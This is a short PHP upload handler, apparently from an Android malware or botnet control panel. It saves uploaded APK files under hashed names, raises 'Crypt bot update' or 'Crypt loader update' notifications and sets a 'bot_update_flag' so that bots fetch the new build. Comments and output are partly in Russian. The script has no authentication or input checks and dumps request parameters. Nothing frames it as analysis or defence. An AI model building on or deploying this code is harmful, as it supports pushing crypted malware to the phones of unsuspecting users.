<?php
	include "config.php";

	$uploadfile = "";
	var_dump($_GET);
	if($_GET['load']=="1"){
		$uploadfile = "./tmp/".md5($_GET['name'])."_l.apk";
	}else{
		$uploadfile = "./tmp/".md5($_GET['name']).".apk";
	}
	echo $uploadfile."\r\n";
	if (move_uploaded_file($_FILES['apk']['tmp_name'], $uploadfile)) {
		echo "Файл корректен и был успешно загружен.\n";
		if($_GET['load']=="1"){
			notification_add_with_id("Crypt loader update","",1,$_GET['name']);
		}else{
			notification_add_with_id("Crypt bot update","",1,$_GET['name']);
		}
		set_user_param_with_id("bot_update_flag",1,$_GET['name']);
	} else {

	}
?>
